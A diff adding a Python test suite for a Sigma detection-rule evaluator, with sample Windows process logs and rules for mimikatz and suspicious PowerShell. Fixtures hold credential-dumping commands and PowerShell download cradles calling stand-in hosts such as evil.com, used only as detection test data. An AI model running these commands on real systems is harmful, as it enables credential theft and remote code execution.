@@ -1,0 +1,384 @@
+"""
+Test suite for the improved SigmaDetectionEvaluator.
+Validates OR conditions, field modifiers, and condition parsing.
+"""
+
+import sys
+import json
+import yaml
+import pandas as pd
+
+# Add project root to path
+sys.path.insert(0, "/home/claude/project")
+
+from utils.detection_engine import SigmaDetectionEvaluator
+
+
+def test_basic_selection():
+    """Test basic single-selection matching."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    df = pd.DataFrame([
+        {"Image": "C:\\Tools\\mimikatz.exe", "User": "admin"},
+        {"Image": "C:\\Windows\\notepad.exe", "User": "user1"},
+    ])
+    
+    detection = {
+        "selection": {"Image": "*mimikatz.exe"},
+        "condition": "selection"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    assert len(result) == 1, f"Expected 1 match, got {len(result)}"
+    assert "mimikatz" in result.iloc[0]["Image"]
+    print("✅ test_basic_selection PASSED")
+
+
+def test_or_condition():
+    """Test OR condition between two selections — the main bug fix."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    # Mimikatz detection rule: selection OR selection_cmdline
+    df = pd.DataFrame([
+        {"Image": "C:\\Tools\\mimikatz.exe", "CommandLine": "mimikatz.exe sekurlsa::logonpasswords"},
+        {"Image": "C:\\Program Files\\mimikatz\\mimikatz.exe", "CommandLine": "mimikatz lsadump::sam"},
+        {"Image": "C:\\Windows\\notepad.exe", "CommandLine": "notepad.exe"},
+        {"Image": "C:\\Windows\\cmd.exe", "CommandLine": "cmd.exe /c sekurlsa::logonpasswords"},
+    ])
+    
+    detection = {
+        "selection": {
+            "Image|endswith": "\\mimikatz.exe"
+        },
+        "selection_cmdline": {
+            "CommandLine|contains": ["sekurlsa", "logonpasswords", "lsadump"]
+        },
+        "condition": "selection or selection_cmdline"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    # Should match: row 0 (both), row 1 (both), row 3 (cmdline only) = 3 matches
+    assert len(result) == 3, f"Expected 3 matches, got {len(result)}: {result['Image'].tolist()}"
+    print("✅ test_or_condition PASSED")
+
+
+def test_and_not_condition():
+    """Test AND NOT condition (selection and not filter)."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    df = pd.DataFrame([
+        {"Image": "C:\\Windows\\powershell.exe", "CommandLine": "powershell IEX something", "User": "SYSTEM"},
+        {"Image": "C:\\Windows\\powershell.exe", "CommandLine": "powershell IEX malicious", "User": "admin"},
+        {"Image": "C:\\Windows\\notepad.exe", "CommandLine": "notepad", "User": "user1"},
+    ])
+    
+    detection = {
+        "selection": {
+            "Image|endswith": "\\powershell.exe",
+            "CommandLine|contains": "IEX"
+        },
+        "filter": {
+            "User": "SYSTEM"
+        },
+        "condition": "selection and not filter"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    assert len(result) == 1, f"Expected 1 match, got {len(result)}"
+    assert result.iloc[0]["User"] == "admin"
+    print("✅ test_and_not_condition PASSED")
+
+
+def test_endswith_modifier():
+    """Test |endswith field modifier."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    df = pd.DataFrame([
+        {"Image": "C:\\Windows\\System32\\cmd.exe"},
+        {"Image": "C:\\Windows\\powershell.exe"},
+        {"Image": "C:\\Tools\\mimikatz.exe"},
+        {"Image": "C:\\Windows\\notepad.exe"},
+    ])
+    
+    detection = {
+        "selection": {
+            "Image|endswith": ["\\cmd.exe", "\\powershell.exe"]
+        },
+        "condition": "selection"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    assert len(result) == 2, f"Expected 2 matches, got {len(result)}"
+    print("✅ test_endswith_modifier PASSED")
+
+
+def test_contains_modifier():
+    """Test |contains field modifier with list values."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    df = pd.DataFrame([
+        {"CommandLine": "powershell.exe -ExecutionPolicy Bypass -File malicious.ps1"},
+        {"CommandLine": "powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com')"},
+        {"CommandLine": "conhost.exe"},
+        {"CommandLine": "powershell -encodedcommand SGVsbG8="},
+    ])
+    
+    detection = {
+        "selection": {
+            "CommandLine|contains": [
+                "Invoke-Expression",
+                "IEX",
+                "DownloadString",
+                "-encodedcommand",
+                "bypass"
+            ]
+        },
+        "condition": "selection"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    # Row 0: "Bypass" matches, Row 1: "IEX" and "DownloadString", Row 3: "-encodedcommand"
+    assert len(result) == 3, f"Expected 3 matches, got {len(result)}: {result['CommandLine'].tolist()}"
+    print("✅ test_contains_modifier PASSED")
+
+
+def test_startswith_modifier():
+    """Test |startswith field modifier."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    df = pd.DataFrame([
+        {"TargetFilename": "C:\\Windows\\System32\\evil.dll"},
+        {"TargetFilename": "C:\\Users\\admin\\file.txt"},
+        {"TargetFilename": "C:\\Windows\\Temp\\malware.exe"},
+    ])
+    
+    detection = {
+        "selection": {
+            "TargetFilename|startswith": "C:\\Windows\\"
+        },
+        "condition": "selection"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    assert len(result) == 2, f"Expected 2 matches, got {len(result)}"
+    print("✅ test_startswith_modifier PASSED")
+
+
+def test_1_of_pattern():
+    """Test '1 of selection*' condition pattern."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    df = pd.DataFrame([
+        {"Image": "C:\\Tools\\mimikatz.exe", "CommandLine": "notepad"},
+        {"Image": "C:\\Windows\\notepad.exe", "CommandLine": "sekurlsa::logonpasswords"},
+        {"Image": "C:\\Windows\\calc.exe", "CommandLine": "calc"},
+    ])
+    
+    detection = {
+        "selection_image": {"Image|endswith": "\\mimikatz.exe"},
+        "selection_cmdline": {"CommandLine|contains": "sekurlsa"},
+        "condition": "1 of selection*"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    assert len(result) == 2, f"Expected 2 matches, got {len(result)}"
+    print("✅ test_1_of_pattern PASSED")
+
+
+def test_full_mimikatz_rule():
+    """Integration test: full mimikatz detection rule against test logs."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    # Actual test logs from the project
+    test_logs = [
+        {
+            "EventID": 4688,
+            "Image": "C:\\Tools\\mimikatz.exe",
+            "CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
+            "User": "CORP\\Administrator",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        },
+        {
+            "EventID": 4688,
+            "Image": "C:\\Program Files\\mimikatz\\mimikatz.exe",
+            "CommandLine": "mimikatz lsadump::sam",
+            "User": "WORKGROUP\\admin",
+            "ParentImage": "C:\\Windows\\System32\\powershell.exe",
+        },
+        {
+            "EventID": 4688,
+            "Image": "C:\\Windows\\notepad.exe",
+            "CommandLine": "notepad.exe",
+            "User": "CORP\\User",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+        }
+    ]
+    
+    # Actual Sigma rule detection block
+    rule_yaml = """
+title: Mimikatz Detection via Process Creation
+detection:
+    selection:
+        Image|endswith: '\\mimikatz.exe'
+    selection_cmdline:
+        CommandLine|contains:
+            - 'sekurlsa'
+            - 'logonpasswords'
+            - 'lsadump'
+    condition: selection or selection_cmdline
+"""
+    
+    rule_data = yaml.safe_load(rule_yaml)
+    detection = rule_data["detection"]
+    
+    df = pd.DataFrame(test_logs)
+    result = evaluator.evaluate(df, detection)
+    
+    # Row 0: matches both selection AND selection_cmdline
+    # Row 1: matches both selection AND selection_cmdline  
+    # Row 2: matches neither
+    assert len(result) == 2, f"Expected 2 matches, got {len(result)}"
+    assert "notepad" not in result["Image"].values
+    print("✅ test_full_mimikatz_rule PASSED")
+
+
+def test_full_powershell_rule():
+    """Integration test: suspicious PowerShell rule against test logs."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    test_logs = [
+        {
+            "EventID": 4688,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\malicious.ps1",
+        },
+        {
+            "EventID": 4688,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
+        },
+        {
+            "EventID": 4688,
+            "Image": "C:\\Windows\\System32\\conhost.exe",
+            "CommandLine": "conhost.exe",
+        }
+    ]
+    
+    rule_yaml = """
+title: Suspicious PowerShell Command Execution
+detection:
+    selection:
+        Image|endswith:
+            - '\\powershell.exe'
+            - '\\pwsh.exe'
+        CommandLine|contains:
+            - 'Invoke-Expression'
+            - 'IEX'
+            - 'DownloadString'
+            - 'WebClient'
+            - 'Invoke-Command'
+            - '-encodedcommand'
+            - '-enc'
+            - 'bypass'
+    condition: selection
+"""
+    
+    rule_data = yaml.safe_load(rule_yaml)
+    detection = rule_data["detection"]
+    
+    df = pd.DataFrame(test_logs)
+    result = evaluator.evaluate(df, detection)
+    
+    # Row 0: powershell.exe + Bypass => match
+    # Row 1: powershell.exe + IEX + DownloadString + WebClient => match
+    # Row 2: conhost.exe => no match
+    assert len(result) == 2, f"Expected 2 matches, got {len(result)}"
+    print("✅ test_full_powershell_rule PASSED")
+
+
+def test_parenthesized_condition():
+    """Test parenthesized conditions: (sel1 or sel2) and not filter."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    df = pd.DataFrame([
+        {"Image": "mimikatz.exe", "CommandLine": "sekurlsa", "User": "admin"},
+        {"Image": "cmd.exe", "CommandLine": "sekurlsa", "User": "SYSTEM"},
+        {"Image": "cmd.exe", "CommandLine": "normal", "User": "user1"},
+        {"Image": "mimikatz.exe", "CommandLine": "normal", "User": "SYSTEM"},
+    ])
+    
+    detection = {
+        "sel1": {"Image": "*mimikatz*"},
+        "sel2": {"CommandLine|contains": "sekurlsa"},
+        "filter": {"User": "SYSTEM"},
+        "condition": "(sel1 or sel2) and not filter"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    # Row 0: mimikatz + sekurlsa, not SYSTEM => match
+    # Row 1: sekurlsa, but SYSTEM => filtered
+    # Row 2: neither sel1 nor sel2 => no match
+    # Row 3: mimikatz, but SYSTEM => filtered
+    assert len(result) == 1, f"Expected 1 match, got {len(result)}"
+    assert result.iloc[0]["User"] == "admin"
+    print("✅ test_parenthesized_condition PASSED")
+
+
+def test_missing_field_graceful():
+    """Test that missing fields don't crash — return no matches."""
+    evaluator = SigmaDetectionEvaluator()
+    
+    df = pd.DataFrame([
+        {"Image": "test.exe", "User": "admin"},
+    ])
+    
+    detection = {
+        "selection": {"NonExistentField|contains": "value"},
+        "condition": "selection"
+    }
+    
+    result = evaluator.evaluate(df, detection)
+    assert len(result) == 0, f"Expected 0 matches, got {len(result)}"
+    print("✅ test_missing_field_graceful PASSED")
+
+
+if __name__ == "__main__":
+    print("=" * 60)
+    print("Running SigmaDetectionEvaluator Tests")
+    print("=" * 60)
+    print()
+    
+    tests = [
+        test_basic_selection,
+        test_or_condition,
+        test_and_not_condition,
+        test_endswith_modifier,
+        test_contains_modifier,
+        test_startswith_modifier,
+        test_1_of_pattern,
+        test_full_mimikatz_rule,
+        test_full_powershell_rule,
+        test_parenthesized_condition,
+        test_missing_field_graceful,
+    ]
+    
+    passed = 0
+    failed = 0
+    
+    for test in tests:
+        try:
+            test()
+            passed += 1
+        except AssertionError as e:
+            print(f"❌ {test.__name__} FAILED: {e}")
+            failed += 1
+        except Exception as e:
+            print(f"❌ {test.__name__} ERROR: {e}")
+            failed += 1
+    
+    print()
+    print("=" * 60)
+    print(f"Results: {passed} passed, {failed} failed out of {len(tests)} tests")
+    print("=" * 60)
+    
+    sys.exit(0 if failed == 0 else 1)
